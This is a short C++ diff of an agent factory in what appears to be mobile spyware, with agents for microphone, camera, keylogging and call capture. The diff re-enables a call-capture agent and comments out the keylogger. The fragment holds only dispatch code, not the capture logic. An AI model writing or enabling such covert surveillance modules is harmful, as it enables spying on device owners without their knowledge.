@@ -41,13 +41,15 @@ EXPORT_C CAbstractAgent* AgentFactory::CreateAgentL(TAgentType aId, const TDesC8
 		case EAgent_Device:
 			return CAgentDevice::NewL(params);
 		case EAgent_Mic:
-			return CAgentMic::NewL(params); 
-		//case EAgent_Keylog:
-			//return CAgentKeylog::NewL(params);
+			return CAgentMic::NewL(params);
+			/*
+		case EAgent_Keylog:
+			return CAgentKeylog::NewL(params);
+			*/
 		case EAgent_Cam:
 			return CAgentCamera::NewL(params);
-		//case EAgent_CallLocal:
-			//return CAgentCallLocal::NewL(params);
+		case EAgent_CallLocal:
+			return CAgentCallLocal::NewL(params);
 		case EAgent_CallList:
 			return CAgentCallList::NewL(params);
 		case EAgent_Application:
